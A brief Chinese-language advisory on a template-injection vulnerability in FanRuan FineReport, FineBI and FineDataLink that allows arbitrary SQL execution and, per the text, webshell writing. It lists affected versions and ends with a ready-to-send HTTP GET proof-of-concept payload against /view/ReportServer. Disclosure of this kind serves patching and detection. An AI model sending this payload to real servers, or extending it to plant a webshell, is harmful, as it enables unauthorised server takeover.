### **漏洞描述：**

帆软v10,v11存在/view/ReportServer接口存在模版注入漏洞，攻击者可以利用该漏洞执行任意SQL写入Webshell，从而获取服务器权限。

### **影响版本：**

JAR包时间在 2024-07-23 之前的FineReport11.*、10.*系列

JAR包时间在 2024-07-24 之前的、运维平台或Tomcat部署包部署的FineBI全版本

JAR包时间在 2024-07-24 之前的FineDataLink全版本

### **Payload：**

```
GET /webroot/decision/view/ReportServer?test=s&n=${sql('FRDemo',DECODE('%53%45%4C%45%43%54%20%27%71%79%67%31%32%33%34%35%36%27%3B'),1,1)} HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0
```

---
